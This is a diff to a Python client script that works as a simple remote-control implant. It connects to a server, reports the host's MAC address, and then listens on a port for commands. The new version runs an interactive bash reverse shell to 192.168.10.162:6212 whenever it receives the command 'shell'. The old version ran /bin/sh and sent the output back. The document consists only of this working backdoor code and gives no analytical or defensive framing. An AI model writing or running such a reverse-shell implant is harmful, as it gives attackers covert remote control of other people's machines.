@@ -1,29 +1,33 @@
-
 import socket
 import uuid
 import subprocess
 import os
 
-SERVER_IP = "172.22.9.105"
+SERVER_IP = "192.168.10.162"
 SERVER_PORT = 12345
+LISTEN_PORT = 49267  # The port to listen on
 
 def get_mac_address():
     mac_num = hex(uuid.getnode()).replace('0x', '')
     mac = ':'.join(mac_num[i: i + 2] for i in range(0, 11, 2))
     return mac
 
-def listen_commands(client_socket):
+def listen_commands():
+    listen_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    listen_socket.bind(('0.0.0.0', LISTEN_PORT))
+    listen_socket.listen(1)
+    print(f"Listening on port {LISTEN_PORT}")
     while True:
+        client_socket, addr = listen_socket.accept()
         command = client_socket.recv(4096).decode()
-        if command == 'ping':
-            client_socket.send('pong'.encode())
-        elif command == 'exit':
-            client_socket.close()
-            break
-        elif command == 'shell':
-            proc = subprocess.Popen(["/bin/sh"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-            stdout_value = proc.communicate()[0]
-            client_socket.send(stdout_value)
+        print(f"Received command: {command}")  # Debugging statement
+        if command == 'shell':
+            print("Executing reverse shell")  # Debugging statement
+            try:
+                subprocess.run(['bash', '-c', 'bash -i >& /dev/tcp/192.168.10.162/6212 0>&1'], check=True)
+            except subprocess.CalledProcessError as e:
+                print(f"Error executing reverse shell: {e}")
+        client_socket.close()
 
 def main():
     client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -33,7 +37,8 @@ def main():
     mac_address = get_mac_address()
     client_socket.send(mac_address.encode())
 
-    listen_commands(client_socket)
+    # Keep the socket open to listen for commands
+    listen_commands()
 
 if __name__ == "__main__":
     main()
